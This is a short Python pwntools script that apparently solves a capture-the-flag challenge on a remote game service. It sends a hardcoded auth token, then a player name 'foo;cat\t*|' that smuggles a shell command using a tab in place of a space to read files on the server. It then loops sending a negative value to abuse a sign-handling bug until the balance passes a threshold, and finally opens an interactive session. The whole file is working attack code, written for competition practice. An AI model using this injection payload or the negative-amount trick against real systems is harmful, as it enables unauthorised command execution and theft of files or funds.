#!/usr/bin/env python

from pwn import *

HOST = 'flood.3k.ctf.to'
PORT = '7777'

auth = b'35ec04cd3b79ab89896836c69257ce86487cf55f'
name = b'foo;cat\t*|'

# name = input().encode()

io = remote(HOST, PORT)

io.sendlineafter(b'> ', auth)
io.sendlineafter(b': ', name)

with log.progress('Mining Gold') as p:
    gold = 0
    while gold <= 250:
        p.status(f"gold: {gold:.2f}")
        io.sendline(b'3')
        io.sendline(b'-0.9')
        # io.sendlineafter(b'> ', '3')
        # io.sendlineafter(b'> ', '-0.9')
        gold -= -0.9
io.sendline(b'5')
io.interactive()